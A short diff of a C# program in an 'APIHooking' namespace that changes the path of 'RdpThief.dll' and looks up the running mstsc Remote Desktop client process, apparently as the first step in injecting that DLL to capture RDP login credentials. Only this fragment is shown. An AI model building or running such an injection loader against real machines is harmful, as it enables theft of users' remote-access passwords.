@@ -23,7 +23,7 @@ namespace APIHooking
         public static extern IntPtr GetModuleHandle(string lpModuleName);
         static void Main(string[] args)
         {
-            String dllName = "C:\\Tools\\RdpThief.dll";
+            String dllName = "C:\\Temp\\RdpThief.dll";
             Process[] mstscProc = Process.GetProcessesByName("mstsc");
             int pid = mstscProc[0].Id;
 
